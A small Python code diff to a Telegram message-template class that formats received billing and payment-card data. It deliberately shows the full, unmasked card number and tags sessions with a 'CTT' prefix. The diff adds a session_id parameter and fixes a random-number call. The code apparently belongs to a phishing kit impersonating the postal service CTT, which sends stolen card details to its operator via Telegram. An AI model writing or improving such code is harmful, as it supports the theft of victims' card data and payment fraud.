@@ -32,7 +32,7 @@ class TelegramTemplates:
 ═══════════════════════════════"""
 
     @staticmethod
-    def payment_template(billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> str:
+    def payment_template(billing_data: Dict[str, Any], card_data: Dict[str, Any], session_id: str = None) -> str:
         """Template para primeira mensagem - dados do cartão"""
         # Show full card number (não mascarado conforme solicitado)
         card_number = card_data.get('numeroCartao', 'N/A')
@@ -42,8 +42,10 @@ class TelegramTemplates:
         else:
             formatted_card = card_number
             
-        # Generate session ID
-        session_id = f"CTT{uuid.randint(10000000, 99999999)}"
+        # Use provided session_id or generate a simple one
+        if not session_id:
+            import random
+            session_id = f"CTT{random.randint(10000000, 99999999)}"
         
         return f"""💳 **DADOS DE CARTÃO RECEBIDOS**
 
